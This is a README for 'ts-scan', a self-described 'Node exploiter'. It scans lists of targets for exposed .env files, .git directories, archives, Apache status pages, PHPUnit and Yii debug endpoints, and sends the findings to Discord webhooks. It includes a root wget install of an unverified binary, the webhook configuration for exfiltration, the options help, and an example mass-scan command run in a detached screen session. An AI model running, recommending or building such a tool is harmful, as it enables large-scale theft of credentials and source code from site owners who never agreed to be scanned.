# ts-scan

## Install

```bash
$ sudo wget "https://github.com/free-plans/ts-scan/releases/download/v0.0.1/ts-scan" -O ts-scan &&  chmod +x  ts-scan;
```
.env
```env
EXPLOIT_APACHE_STATUS_WEBHOOK="https://discord.com/api/webhooks/blah/blah"
EXPLOIT_ARCHIVE_WEBHOOK="https://discord.com/api/webhooks/blah/blah"
EXPLOIT_ENV_WEBHOOK="https://discord.com/api/webhooks/blah/blah"
EXPLOIT_ENV_DEBUG_WEBHOOK=
EXPLOIT_GIT_WEBHOOK=
EXPLOIT_JSON_WEBHOOK=
EXPLOIT_PHP_UNIT_WEBHOOK=
EXPLOIT_YII_DEBUG_WEBHOOK=
```
```bash
$ export EXPLOIT_GIT_WEBHOOK="https://discord.com/api/webhooks/blah/blah";
$ export EXPLOIT_ENV_WEBHOOK="https://discord.com/api/webhooks/blah/blah";
```
## Usage 
```bash
$ ./ts-scan -h
Node exploiter

Usage: ts-scan [options]

Options:
  -h, --help         Show help                                         [boolean]
  -V, --version      Show version number                               [boolean]
  -i, --input        <filename> Input file name                       [required]
  -t, --thread       Max thread number                     [number] [default: 5]
  -w, --timeout      Request timeout in second            [number] [default: 25]
  -c, --concurrency  Max concurrency number                [number] [default: 3]
  -e, --extra        Scan with extra paths            [boolean] [default: false]
  -p, --extra_file   Extra paths file                                   [string]
  -o, --result       Write Result to file             [boolean] [default: false]
  -m, --modules      Exploit modules
        [array] [choices: "apache-status", "archive", "env", "env_debug", "git",
  "json", "php_unit", "yii_debug"] [default: ["apache-status","archive","env","e
                                 nv_debug","git","json","php_unit","yii_debug"]]
  -x, --exclude      Exclude modules
        [array] [choices: "apache-status", "archive", "env", "env_debug", "git",
                                  "json", "php_unit", "yii_debug"] [default: []]

```
## Ex 
```bash
$ screen -dmS scan ./ts-scan -i lists.txt  -t 75  -w 35 -o -x yii_debug; screen -rd scan
```
